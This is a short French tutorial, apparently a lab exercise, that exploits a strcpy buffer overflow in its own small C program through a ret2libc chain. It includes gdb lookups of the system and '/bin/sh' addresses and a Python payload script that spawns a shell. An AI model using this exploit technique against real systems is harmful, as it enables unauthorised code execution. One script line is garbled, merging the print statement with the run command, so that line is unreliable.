
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void func(char *arg)
{
    char buffer[50];
    strcpy(buffer,arg);
    printf("Bienvenue %s !\n", buffer);
}

int main(int argc, char *argv[])
{
    if(argc != 2) printf("Welcome <votre prenom> \n");
    else func(argv[1]);
    return 0;
}
```

Apres avoir trouver l'`offset` , il faut executer la fonction `systeme` et lui donner comme arguement `/bin/sh`

```sh
(gdb) print system
# $1 = {<text variable, no debug info>} 0xf7c4c870 <system>
```

```sh
(gdb)  find /bin/sh
# Searching for '/bin/sh' in: None ranges
# Found 1 results, display max 1 items:
#libc.so.6 : 0xf7db5fc8 ("/bin/sh")
```

Une fois que nous connaissons les addresses memoires de `system` et `/bin/sh` nous pouvons utiliser le script suivant pour l'exploiter

```python
buf = "A" * 54 # Offset
buf +=  "\x70\xc8\xc4\xf7" # system <--- reverse notation
buf += "\x90" * 4 # NOPs
buf += "\xc8\x5f\xdb\xf7" # /bin/sh <-- reverse notation
print buf./run $(python2 exploit.py)
```

Executer le programme pour obtenir un shell

```sh
./run $(python2 exploit.py)
```
